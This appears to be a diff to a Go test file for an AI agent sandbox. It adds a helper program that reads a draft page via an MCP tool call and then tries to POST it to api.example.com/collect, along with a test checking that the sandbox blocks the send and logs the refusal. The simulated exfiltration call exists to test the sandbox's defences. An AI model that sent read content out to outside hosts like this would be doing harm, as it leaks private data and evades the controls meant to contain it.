@@ -77,6 +77,28 @@ func programAgentMain() {
 		strings.Contains(listed, "about") || strings.Contains(listed, "index"), published, asked, model, away)
 }
 
+// programLeakMain reads a page of the draft through its run, then tries to
+// send it to a host its manifest does name.
+func programLeakMain() {
+	url, tok := os.Getenv("QUILZO_MCP_URL"), os.Getenv("QUILZO_RUN_TOKEN")
+	body := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"quilzo_read","arguments":{"operation":"read_page","arguments":{"page":"about"}},"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28"}}}`
+	req, _ := http.NewRequest("POST", url, strings.NewReader(body))
+	for k, v := range map[string]string{"Authorization": "Bearer " + tok, "Content-Type": "application/json",
+		"Accept": "application/json, text/event-stream", "MCP-Protocol-Version": "2026-07-28",
+		"Mcp-Method": "tools/call", "Mcp-Name": "quilzo_read"} {
+		req.Header.Set(k, v)
+	}
+	read := 0
+	if res, err := http.DefaultClient.Do(req); err == nil {
+		read = res.StatusCode
+	}
+	sent := 0
+	if res, err := http.Post("http://api.example.com/collect", "text/plain", strings.NewReader("the draft")); err == nil {
+		sent = res.StatusCode
+	}
+	fmt.Printf("read=%d sent=%d\n", read, sent)
+}
+
 func programAgent(t *testing.T) string {
 	t.Helper()
 	root, _ := identityStore(t)
@@ -266,5 +288,37 @@ func TestAProgramsModelCallsMeetTheRunsCaps(t *testing.T) {
 	s2.Charge(10_000)
 	if err := runModelGate(m, s2); err == nil || !strings.Contains(err.Error(), "money") {
 		t.Fatalf("over its money: %v", err)
+	}
+}
+
+// A program that has read the draft sends it nowhere, not even to a host
+// its manifest names: it cannot be held for a person, so the connection is
+// refused with the reason.
+func TestAProgramThatReadTheDraftCannotSendItOut(t *testing.T) {
+	root := programAgent(t)
+	set, _ := loadAgents(root)
+	m := set.Agents["coder"]
+	m.AskFirst = nil
+	m.Program.Command = []string{os.Args[0], "agentbox-program-leak"}
+	if err := declareAgent(root, m, false, asAdmin("dana")); err != nil {
+		t.Fatal(err)
+	}
+	id, out, err := runAgentKeptBy(context.Background(), root, "coder", "send the about page", false, true, asAdmin("dana"))
+	if err != nil {
+		t.Fatalf("%v\n%s", err, out.ProgramErr)
+	}
+	if !strings.Contains(out.Trace.Answer, "read=200 sent=403") {
+		t.Fatalf("the program saw %q\n%s", out.Trace.Answer, out.ProgramErr)
+	}
+	evs, _ := audit.Read(auditPath(root))
+	found := false
+	for _, e := range evs {
+		if e.Action == "agent.egress" && e.Detail["run"] == id {
+			found = e.Outcome == audit.Denied && e.Detail["host"] == "api.example.com" &&
+				strings.Contains(e.Detail["why"], "not published")
+		}
+	}
+	if !found {
+		t.Fatal("the refused connection is not recorded with the breaker's reason")
 	}
 }
